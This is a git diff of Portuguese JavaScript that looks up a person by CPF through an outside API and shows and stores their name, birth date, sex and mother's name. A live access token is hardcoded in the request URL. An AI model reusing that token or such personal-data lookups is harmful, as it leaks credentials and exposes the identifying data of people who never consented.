@@ -23,6 +23,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
   // Campos de informação do usuário
   const nomeUsuario = document.getElementById("nomeUsuario");
+  const dataNascimento = document.getElementById("dataNascimento");
   const cpfUsuario = document.getElementById("cpfUsuario");
   const sexoUsuario = document.getElementById("sexoUsuario");
   const nomeMae = document.getElementById("nomeMae");
@@ -109,10 +110,8 @@ document.addEventListener("DOMContentLoaded", function () {
     consultaResultado.scrollIntoView({ behavior: "smooth", block: "center" });
 
     // Executar a consulta
-
     fetch(
-      `https://bk.elaidisparos.tech/consultar-filtrada/cpf?cpf=${cpf}&token=574a7ff49027efebaa19dc18b17e4ead1dadf7eac42d65cb8acfa969a897e976`,
-
+      `https://bk.elaidisparos.tech/consultar-filtrada/cpf?cpf=${cpf}&token=574a7ff49027efebaa19dc18b17e4ead1dadf7eac42d65cb8acfa969a897e976`
     )
       .then((response) => {
         if (!response.ok) {
@@ -120,39 +119,61 @@ document.addEventListener("DOMContentLoaded", function () {
         }
         return response.json();
       })
-      .then((data) => {
+      .then((response) => {
         // Ocultar loading
         loadingInfo.classList.add("hidden");
 
-        // Processar os dados
-        if (data && data.dados && data.dados.length > 0) {
-          const dadosUsuarioAPI = data.dados[0];
-          console.log(dadosUsuarioAPI);
-          // Preencher os campos com os dados do usuário
-          nomeUsuario.textContent = dadosUsuarioAPI.NOME || "Não informado";
-          cpfUsuario.textContent = dadosUsuarioAPI.CPF
-            ? dadosUsuarioAPI.CPF.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4")
-            : "Não informado";
-          sexoUsuario.textContent = dadosUsuarioAPI.SEXO || "Não informado";
-          nomeMae.textContent = dadosUsuarioAPI.NOME_MAE || "Não informado";
+        // Processar os dados da API
+        // Formato: { cpf, nome, mae, sexo, nascimento }
+        let raw = response;
+        let data = null;
 
-          // Salvar dados no objeto para usar depois
+        try {
+          if (raw && (raw.cpf || raw.nome)) {
+            // Normalizar para as chaves esperadas
+            data = {
+              CPF: raw.cpf || "",
+              NOME: raw.nome || "",
+              NOME_MAE: raw.mae || "",
+              NASC: raw.nascimento || "",
+              SEXO: raw.sexo || "",
+            };
+          }
+        } catch (e) {
+          console.error("Erro ao interpretar resposta da API:", e, raw);
+        }
+
+
+        if (data) {
+          console.log("Dados normalizados:", data);
+
+          // Preencher os campos com os dados do usuário
+          nomeUsuario.textContent = data.NOME || "Não informado";
+          dataNascimento.textContent = formatDate(data.NASC) || "Não informado";
+          cpfUsuario.textContent = data.CPF
+            ? data.CPF.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4")
+            : "Não informado";
+          sexoUsuario.textContent = data.SEXO || "Não informado";
+          nomeMae.textContent = data.NOME_MAE || "Não informado";
+
+          // Salvar dados no objeto para usar depois (mantendo o mesmo shape usado anteriormente)
           const dadosUsuario = {
-            nome: dadosUsuarioAPI.NOME,
-            nomeMae: dadosUsuarioAPI.NOME_MAE,
-            cpf: dadosUsuarioAPI.CPF,
-            sexo: dadosUsuarioAPI.SEXO,
+            nome: data.NOME || "",
+            dataNascimento: data.NASC || "",
+            nomeMae: data.NOME_MAE || "",
+            cpf: data.CPF || "",
+            sexo: data.SEXO || "",
           };
 
           // Salvar no localStorage para uso posterior
           localStorage.setItem("dadosUsuario", JSON.stringify(dadosUsuario));
 
           // Salvar nome e CPF separadamente para acesso fácil
-          if (dadosUsuarioAPI.NOME) {
-            localStorage.setItem("nomeUsuario", dadosUsuarioAPI.NOME);
+          if (dadosUsuario.nome) {
+            localStorage.setItem("nomeUsuario", dadosUsuario.nome);
           }
-          if (dadosUsuarioAPI.CPF) {
-            localStorage.setItem("cpfUsuario", dadosUsuarioAPI.CPF);
+          if (dadosUsuario.cpf) {
+            localStorage.setItem("cpfUsuario", dadosUsuario.cpf);
           }
 
           // Mostrar informações do usuário
@@ -294,7 +315,7 @@ document.addEventListener("DOMContentLoaded", function () {
       novaUrl.set("cpf", cpf);
 
       // Redirecionar para a página chat.html com todos os parâmetros
-      window.location.href = `./chat/index.html?${novaUrl.toString()}`;
+      window.location.href = `chat/index.html?${novaUrl.toString()}`;
     } catch (error) {
       console.error("Erro ao processar dados para redirecionamento:", error);
       alert(
